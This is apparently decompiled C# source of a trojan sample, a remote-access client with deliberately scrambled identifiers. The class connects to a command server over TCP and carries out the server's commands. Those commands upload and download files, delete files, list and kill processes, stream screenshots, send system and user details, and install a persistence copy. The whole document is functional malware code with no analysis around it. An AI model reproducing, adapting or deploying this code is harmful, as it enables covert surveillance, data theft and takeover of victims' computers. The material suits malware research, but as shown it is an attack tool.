// Decompiled with JetBrains decompiler
// Type: wardhmrias.MLREDM
// Assembly: wardhmrias, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 08CBA86B-489B-4E7A-8D19-875058370078
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-5dcb736bf556729b30654fe97da034c1ccd7471f7587cb82dc33f4aef2248b9c.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace wardhmrias
{
  public class MLREDM
  {
    public bool wardhmriasis_wodrking = false;
    private bool wardhmriasiswditch = false;
    private bool wardhmriasthrReuning = false;
    private bool wardhmriasstr_wdriter = false;
    private bool wardhmriascapdScreen = false;
    private Dictionary<string, byte[]> wardhmriastadsks = new Dictionary<string, byte[]>();
    public NetworkStream wardhmriasnetdStream;
    private int wardhmriasbufdfSize = 1024;
    private wardhmrias.wardhmrias wardhmriasHdD = new wardhmrias.wardhmrias();
    private int wardhmriasbytesrRead = 0;
    public bool wardhmriasreqtCnls = false;
    public bool wardhmriasautCnls = false;
    public DateTime wardhmriaslTimeiUtc;
    private Thread wardhmriasfundThread;
    private ELDRARE wardhmriasStateiObj = new ELDRARE();
    private MLRLEINF wardhmriasuitpC;
    private OLRDMR wardhmriasCMiD;
    private int wardhmriasscrfSize = 200;
    private ThreadStart wardhmriasfunStarter;
    public int port_sn = 0;
    public TcpClient wardhmriastcpsck;
    private MemoryStream msdStram = new MemoryStream();
    private SLCLRNS wardhmriascdaps = new SLCLRNS();
    private Bitmap image;

    public void wardhmriassavetFile(string filetPath)
    {
      try
      {
        byte[] bytes = this.wardhmriaspull_dfata();
        if (bytes == null)
          return;
        File.WriteAllBytes(filetPath, bytes);
      }
      catch
      {
      }
    }

    private void wardhmriassee_spyo()
    {
      if (!this.wardhmriasiswditch)
      {
        this.wardhmriasiswditch = true;
        this.wardhmriasnetdStream = this.wardhmriasCMiD.wardhmriasNdS(this.wardhmriastcpsck);
        this.wardhmriascapdScreen = false;
        while (this.wardhmriasis_wodrking)
        {
          string[] switchType = this.wardhmriasget_comdand();
          if (switchType == null)
          {
            this.wardhmriasis_wodrking = false;
            break;
          }
          this.wardhmriasreqtCnls = false;
          string lower = switchType[0].ToLower();
          string str;
          if (lower.Split('-').Length > 1)
            str = "wardhmrias-" + lower.Split('-')[1];
          else
            str = "wardhmrias-" + lower;
          switch (str)
          {
            case "wardhmrias-putsrt":
            case "wardhmrias-puatsrt":
              this.wardhmriasload_atpp();
              break;
            case "wardhmrias-gedtavs":
            case "wardhmrias-gedatavs":
              this.wardhmriasfunStarter = (ThreadStart) (() => this.wardhmriaslist_protsses("gedatavs"));
              this.wardhmriasfundThread = new Thread(this.wardhmriasfunStarter);
              this.wardhmriasfundThread.Start();
              break;
            case "wardhmrias-thdumb":
            case "wardhmrias-thdaumb":
              this.wardhmriasimdage_intfo(switchType[1]);
              break;
            case "wardhmrias-procl":
            case "wardhmrias-praocl":
              this.wardhmriasfunStarter = (ThreadStart) (() => this.wardhmriaslist_protsses("praocl"));
              this.wardhmriasfundThread = new Thread(this.wardhmriasfunStarter);
              this.wardhmriasfundThread.Start();
              break;
            case "wardhmrias-filsz":
            case "wardhmrias-fialsz":
              this.wardhmriasfile_intfo(switchType[1]);
              break;
            case "wardhmrias-dodwf":
            case "wardhmrias-dodawf":
              this.wardhmriassavetFile(switchType[1]);
              break;
            case "wardhmrias-endpo":
            case "wardhmrias-enadpo":
              try
              {
                Process.GetProcessById((int) Convert.ToInt16(switchType[1].Trim())).Kill();
                break;
              }
              catch
              {
                break;
              }
            case "wardhmrias-rudpth":
            case "wardhmrias-rudapth":
              this.wardhmriaspush_dtata((byte[]) null, "wardhmrias-apapth=|wardhmrias".Split('|')[0] + DLAONIF.wardhmriasget_mdpath());
              break;
            case "wardhmrias-scrsz":
            case "wardhmrias-scarsz":
              this.wardhmriasscredendrSize(switchType[1]);
              break;
            case "wardhmrias-dirs":
            case "wardhmrias-diars":
              this.wardhmriasfundThread = new Thread(new ThreadStart(this.wardhmriaslistDrivdes));
              this.wardhmriasfundThread.Start();
              break;
            case "wardhmrias-stops":
            case "wardhmrias-staops":
              this.wardhmriascapdScreen = false;
              break;
            case "wardhmrias-csdcreen":
            case "wardhmrias-csdacreen":
              this.wardhmriassee_stgcren(switchType[1].ToString());
              break;
            case "wardhmrias-cnls":
            case "wardhmrias-cnals":
              this.wardhmriasautCnls = true;
              this.wardhmriasreqtCnls = true;
              this.wardhmriascapdScreen = false;
              break;
            case "wardhmrias-dowr":
            case "wardhmrias-doawr":
              this.wardhmriassavetFile(switchType[1]);
              break;
            case "wardhmrias-scren":
            case "wardhmrias-scaren":
              this.wardhmriascapdScreen = true;
              this.wardhmriasfunStarter = (ThreadStart) (() => this.wardhmriasis_scrteen(switchType[1]));
              this.wardhmriasfundThread = new Thread(this.wardhmriasfunStarter);
              this.wardhmriasfundThread.Start();
              break;
            case "wardhmrias-fldr":
            case "wardhmrias-fladr":
              string Folders = this.wardhmriasHdD.wardhmriascheck_Foldrers(switchType[1]);
              if (Folders != null)
              {
                this.wardhmriasfunStarter = (ThreadStart) (() => this.wardhmriaspush_dtata((byte[]) null, "wardhmrias-fladr=|wardhmrias".Split('|')[0] + Folders));
                this.wardhmriasfundThread = new Thread(this.wardhmriasfunStarter);
                this.wardhmriasfundThread.Start();
                break;
              }
              break;
            case "wardhmrias-udlt":
            case "wardhmrias-udalt":
              this.wardhmriasCMiD.wardhmriasremove_udser();
              break;
            case "wardhmrias-info":
            case "wardhmrias-inafo":
              this.wardhmriasfundThread = new Thread(new ThreadStart(this.wardhmriasuser_indfo));
              this.wardhmriasfundThread.Start();
              break;
            case "wardhmrias-runf":
            case "wardhmrias-ruanf":
              this.wardhmriasCMiD.wardhmriasdo_prodess(switchType[1].Split('>')[0]);
              break;
            case "wardhmrias-file":
            case "wardhmrias-fiale":
              this.wardhmriasfunStarter = (ThreadStart) (() => this.wardhmriaspush_dfile(switchType[1]));
              this.wardhmriasfundThread = new Thread(this.wardhmriasfunStarter);
              this.wardhmriasfundThread.Start();
              break;
            case "wardhmrias-delt":
            case "wardhmrias-dealt":
              this.wardhmriasremove_dfile(switchType[1]);
              break;
            case "wardhmrias-fles":
            case "wardhmrias-flaes":
              string files = this.wardhmriasHdD.wardhmriaslookup_Fidles(switchType[1]);
              if (files != null)
              {
                this.wardhmriasfunStarter = (ThreadStart) (() => this.wardhmriaspush_dtata((byte[]) null, "wardhmrias-flaes=|wardhmrias".Split('|')[0] + files));
                this.wardhmriasfundThread = new Thread(this.wardhmriasfunStarter);
                this.wardhmriasfundThread.Start();
                break;
              }
              break;
            case "wardhmrias-afile":
            case "wardhmrias-afaile":
              this.wardhmriasfunStarter = (ThreadStart) (() => this.wardhmriassend_audto(switchType[1]));
              this.wardhmriasfundThread = new Thread(this.wardhmriasfunStarter);
              this.wardhmriasfundThread.Start();
              break;
            case "wardhmrias-listf":
            case "wardhmrias-liastf":
              this.wardhmriasfunStarter = (ThreadStart) (() => this.wardhmriasHdD.wardhmriaslook_Fides(switchType[1]));
              this.wardhmriasfundThread = new Thread(this.wardhmriasfunStarter);
              this.wardhmriasfundThread.Start();
              break;
          }
        }
        this.wardhmriasis_wodrking = false;
        this.wardhmriascapdScreen = false;
      }
      this.wardhmriasiswditch = false;
    }

    private bool wardhmriasIPSrFI()
    {
      try
      {
        DLAONIF.wardhmriasdefaudltP = this.wardhmriasCMiD.wardhmriasserverIPtD();
        this.wardhmriastcpsck = new TcpClient();
        this.wardhmriastcpsck.Connect(DLAONIF.wardhmriasdefaudltP, DLAONIF.wardhmriaspodrt);
        return true;
      }
      catch
      {
        this.wardhmriaspodrts_sdwitch();
        return false;
      }
    }

    public string wardhmriasfile_intfo(string path, bool ret = false)
    {
      try
      {
        FileInfo fileInfo = new FileInfo(path);
        string name = fileInfo.Name;
        string str1;
        if (ret)
          str1 = "<|wardhmrias".Split('|')[0];
        else
          str1 = ">|wardhmrias".Split('|')[0];
        string str2 = name + str1;
        string str3 = fileInfo.CreationTimeUtc.Date.ToString();
        string str4;
        if (ret)
          str4 = "<|wardhmrias".Split('|')[0];
        else
          str4 = ">|wardhmrias".Split('|')[0];
        string str5 = str2 + str3 + str4;
        string str6 = this.wardhmriasget_dsize(fileInfo.Length);
        string str7;
        if (ret)
          str7 = "<|wardhmrias".Split('|')[0];
        else
          str7 = ">|wardhmrias".Split('|')[0];
        string str8 = str5 + str6 + str7;
        if (!ret)
          this.wardhmriaspush_dtata((byte[]) null, "wardhmrias-fialsz=|wardhmrias".Split('|')[0] + str8);
        return str8;
      }
      catch
      {
        return "";
      }
    }

    public void wardhmriasdo_stadrt()
    {
      DLAONIF.wardhmriaspodrt = DLAONIF.ports[0];
      this.wardhmriasuitpC = new MLRLEINF();
      this.wardhmriasCMiD = new OLRDMR(this);
      this.wardhmriasHdD.iservder = this;
      this.wardhmriasHdD.wardhmriasmaindPath = DLAONIF.wardhmriasget_mdpath();
      this.wardhmriasStateiObj.wardhmriastimer = new System.Threading.Timer(new TimerCallback(this.wardhmriaslookup_codnr), (object) this.wardhmriasStateiObj, 31280, 37420);
    }

    private void wardhmriaslookup_codnr(object ztource)
    {
      try
      {
        if (!this.wardhmriasthrReuning)
        {
          this.wardhmriasthrReuning = true;
          if (!this.wardhmriasis_wodrking || !this.wardhmriastcpsck.Connected)
          {
            this.wardhmriasis_wodrking = this.wardhmriasIPSrFI();
            if (this.wardhmriasis_wodrking)
            {
              this.wardhmriasbufdfSize = this.wardhmriastcpsck.ReceiveBufferSize;
              this.wardhmriassee_spyo();
            }
          }
        }
        this.wardhmriasthrReuning = false;
      }
      catch
      {
        this.wardhmriasthrReuning = false;
        this.wardhmriasstr_wdriter = false;
        this.wardhmriasis_wodrking = false;
        this.wardhmriasiswditch = false;
      }
    }

    public void wardhmriaspodrts_sdwitch()
    {
      try
      {
        ++this.port_sn;
        DLAONIF.wardhmriaspodrt = DLAONIF.ports[this.port_sn];
        if (this.port_sn < DLAONIF.ports.Length - 1)
          return;
        this.port_sn = 0;
      }
      catch
      {
        this.port_sn = 0;
      }
    }

    public bool wardhmriassend_audto(string fileinfo)
    {
      try
      {
        string path = fileinfo.Split('>')[0];
        if (File.Exists(path))
        {
          string fileName = Path.GetFileName(path);
          byte[] data = File.ReadAllBytes(path);
          fileinfo = fileinfo + ">" + fileName;
          this.wardhmriaspush_dtata(data, "wardhmrias-afaile=" + fileinfo);
          return false;
        }
        this.wardhmriaspush_dtata((byte[]) null, "wardhmrias-anafod=" + fileinfo);
        return false;
      }
      catch
      {
        return false;
      }
    }

    public void wardhmriaslist_protsses(string cmd)
    {
      try
      {
        string str = "";
        Process[] processes = Process.GetProcesses();
        for (int index = 0; index <= processes.Length - 1; ++index)
          str = str + (object) processes[index].Id + ">|wardhmrias".Split('|')[0] + processes[index].ProcessName + ">|wardhmrias".Split('|')[0] + "0>|wardhmrias".Split('|')[0] + "<";
        if (str == "")
          str = "No-Found!> > > <|wardhmrias".Split('|')[0];
        this.wardhmriaspush_dtata(DLAONIF.getBytedArray(str), "wardhmrias-" + cmd + "=pcaess|wardhmrias".Split('|')[0]);
      }
      catch
      {
      }
    }

    public void wardhmriasload_atpp()
    {
      try
      {
        string executablePath = Application.ExecutablePath;
        string path = DLAONIF.wardhmriasget_mdpath() + DLAONIF.wardhmriasmaindApp + ".exe|wardhmrias".Split('|')[0];
        if (path != executablePath)
          File.WriteAllBytes(path, File.ReadAllBytes(executablePath));
        Thread.Sleep(10);
        DLAONIF.wardhmriasset_rdun("duorb|wardhmrias".Split('|')[0], DLAONIF.wardhmriasget_mdpath() + DLAONIF.wardhmriasmaindApp + ".exe|wardhmrias".Split('|')[0]);
      }
      catch
      {
      }
    }

    private void wardhmriasimdage_intfo(string path)
    {
      try
      {
        Bitmap bitmap = new Bitmap((Image) new Bitmap(path), new Size(200, 150));
        if (bitmap == null)
          return;
        FileInfo fileInfo = new FileInfo(path);
        string str1 = fileInfo.Name + ">|wardhmrias".Split('|')[0];
        DateTime dateTime = fileInfo.CreationTimeUtc;
        dateTime = dateTime.Date;
        string str2 = dateTime.ToString();
        string str3 = ">|wardhmrias".Split('|')[0];
        string str4 = str1 + str2 + str3 + this.wardhmriasget_dsize(fileInfo.Length) + ">";
        MemoryStream memoryStream = new MemoryStream();
        bitmap.Save((Stream) memoryStream, ImageFormat.Gif);
        this.wardhmriaspush_dtata(memoryStream.ToArray(), "wardhmrias-thaumb=|wardhmrias".Split('|')[0] + str4);
      }
      catch
      {
      }
    }

    private void wardhmriassee_stgcren(string screendSize)
    {
      try
      {
        this.wardhmriasscrfSize = (int) Convert.ToInt16(screendSize.Split('>')[0].Trim());
        this.image = this.wardhmriascdaps.wardhmriasscreden(this.wardhmriasscrfSize);
        this.msdStram.SetLength(0L);
        this.image.Save((Stream) this.msdStram, ImageFormat.Jpeg);
        this.wardhmriaspush_dtata(this.msdStram.ToArray(), "wardhmrias-sascr=wardhmrias|wardhmrias".Split('|')[0]);
      }
      catch
      {
      }
    }

    private void wardhmriasis_scrteen(string screendSize)
    {
      try
      {
        this.wardhmriasscrfSize = (int) Convert.ToInt16(screendSize.Split('>')[0].Trim());
        while (this.wardhmriascapdScreen && this.wardhmriasis_wodrking)
        {
          this.image = this.wardhmriascdaps.wardhmriasscreden(this.wardhmriasscrfSize);
          this.msdStram.SetLength(0L);
          this.image.Save((Stream) this.msdStram, ImageFormat.Jpeg);
          this.wardhmriaspush_dtata(this.msdStram.ToArray(), "wardhmrias-scaren=wardhmrias|wardhmrias".Split('|')[0]);
        }
      }
      catch
      {
      }
    }

    private void wardhmriasuser_indfo() => this.wardhmriaspush_dtata(DLAONIF.getBytedArray(this.wardhmriasuitpC.wardhmriaslancdard + "|" + this.wardhmriasuitpC.wardhmriascnadme + "|" + this.wardhmriasuitpC.wardhmriasuntame + "|" + this.wardhmriasuitpC.wardhmriasuitp + "|" + DLAONIF.wardhmriasdOsname() + "|" + this.wardhmriasuitpC.wardhmriasaptyer + "|" + "| !wardhmrias".Split('!')[0] + "|" + this.wardhmriasuitpC.wardhmriasclientdNum + "|" + DLAONIF.wardhmriasget_mdpath()), "wardhmrias-inafo=uzaer|wardhmrias".Split('|')[0]);

    private void wardhmriasscredendrSize(string scSize)
    {
      try
      {
        this.wardhmriasscrfSize = (int) Convert.ToInt16(scSize.Split('>')[0].Trim());
      }
      catch
      {
      }
    }

    public bool wardhmriaspush_dtata(byte[] data, string type, bool tmp = false)
    {
      try
      {
        if (this.wardhmriasstr_wdriter)
          return false;
        this.wardhmriasstr_wdriter = true;
        byte[] bytedArray = DLAONIF.getBytedArray(type);
        int num1 = 0;
        int num2 = 5;
        byte[] numArray = (byte[]) null;
        if (data != null)
        {
          numArray = BitConverter.GetBytes(data.Length);
          num1 = data.Length;
          num2 = 10;
        }
        byte[] bytes = BitConverter.GetBytes(bytedArray.Length);
        byte[] buffer = new byte[num2 + bytedArray.Length + num1];
        bytes.CopyTo((Array) buffer, 0);
        bytedArray.CopyTo((Array) buffer, 5);
        if (data != null)
        {
          numArray.CopyTo((Array) buffer, 5 + bytedArray.Length);
          data.CopyTo((Array) buffer, 10 + bytedArray.Length);
        }
        int offset = 0;
        int count;
        for (int length = buffer.Length; length > 0 && !this.wardhmriasreqtCnls; length -= count)
        {
          count = length > this.wardhmriasbufdfSize ? this.wardhmriasbufdfSize : length;
          this.wardhmriasnetdStream.Write(buffer, offset, count);
          offset += count;
        }
        this.wardhmriasstr_wdriter = false;
        return !this.wardhmriasreqtCnls;
      }
      catch
      {
        this.wardhmriasstr_wdriter = false;
        this.wardhmriasis_wodrking = false;
        return false;
      }
    }

    private string wardhmriasget_dsize(long byteCodunt)
    {
      try
      {
        string[] strArray = new string[7]
        {
          "B|wardhmrias".Split('|')[0],
          "KB|wardhmrias".Split('|')[0],
          "MB|wardhmrias".Split('|')[0],
          "GB|wardhmrias".Split('|')[0],
          "TB|wardhmrias".Split('|')[0],
          "PB|wardhmrias".Split('|')[0],
          "EB|wardhmrias".Split('|')[0]
        };
        if (byteCodunt == 0L)
          return "0" + strArray[0];
        long a = Math.Abs(byteCodunt);
        int int32 = Convert.ToInt32(Math.Floor(Math.Log((double) a, 1024.0)));
        double num = Math.Round((double) a / Math.Pow(1024.0, (double) int32), 1);
        return ((double) Math.Sign(byteCodunt) * num).ToString() + strArray[int32];
      }
      catch
      {
        return "";
      }
    }

    private void wardhmriaspush_dfile(string lfile)
    {
      try
      {
        if (!File.Exists(lfile))
          return;
        string fileName = Path.GetFileName(lfile);
        this.wardhmriaspush_dtata(File.ReadAllBytes(lfile), "wardhmrias-fiale=|wardhmrias".Split('|')[0] + lfile + ">0>" + fileName, true);
      }
      catch
      {
      }
    }

    public void wardhmriasremove_dfile(string path)
    {
      try
      {
        File.Delete(path);
      }
      catch
      {
      }
    }

    public string[] wardhmriasget_comdand()
    {
      try
      {
        byte[] buffer = new byte[5];
        this.wardhmriasbytesrRead = this.wardhmriasnetdStream.Read(buffer, 0, 5);
        int int32 = BitConverter.ToInt32(buffer, 0);
        byte[] numArray = new byte[int32];
        int offset = 0;
        for (int index = int32; index > 0; index -= this.wardhmriasbytesrRead)
        {
          int count = index > this.wardhmriasbufdfSize ? this.wardhmriasbufdfSize : index;
          this.wardhmriasbytesrRead = this.wardhmriasnetdStream.Read(numArray, offset, count);
          offset += this.wardhmriasbytesrRead;
        }
        string str = Encoding.UTF8.GetString(numArray, 0, int32).ToString();
        if (str.Trim() == "")
          return (string[]) null;
        return str.Split('=');
      }
      catch
      {
        this.wardhmriasis_wodrking = false;
        return (string[]) null;
      }
    }

    public byte[] wardhmriaspull_dfata()
    {
      try
      {
        int offset = 0;
        byte[] buffer1 = new byte[5];
        this.wardhmriasbytesrRead = this.wardhmriasnetdStream.Read(buffer1, 0, 5);
        int int32 = BitConverter.ToInt32(buffer1, 0);
        byte[] buffer2 = new byte[int32];
        for (int index = int32; index > 0 && !this.wardhmriasreqtCnls; index -= this.wardhmriasbytesrRead)
        {
          int count = index > this.wardhmriasbufdfSize ? this.wardhmriasbufdfSize : index;
          this.wardhmriasbytesrRead = this.wardhmriasnetdStream.Read(buffer2, offset, count);
          offset += this.wardhmriasbytesrRead;
        }
        if (this.wardhmriasreqtCnls)
        {
          this.wardhmriasnetdStream.Flush();
          do
            ;
          while (this.wardhmriasnetdStream.DataAvailable && this.wardhmriasnetdStream.ReadByte() >= 0);
          buffer2 = (byte[]) null;
        }
        return buffer2;
      }
      catch
      {
        this.wardhmriasis_wodrking = false;
        return (byte[]) null;
      }
    }

    private void wardhmriaslistDrivdes()
    {
      try
      {
        this.wardhmriaspush_dtata((byte[]) null, "wardhmrias-diars=" + this.wardhmriasHdD.wardhmriaslookup_Drtives());
      }
      catch
      {
      }
    }
  }
}
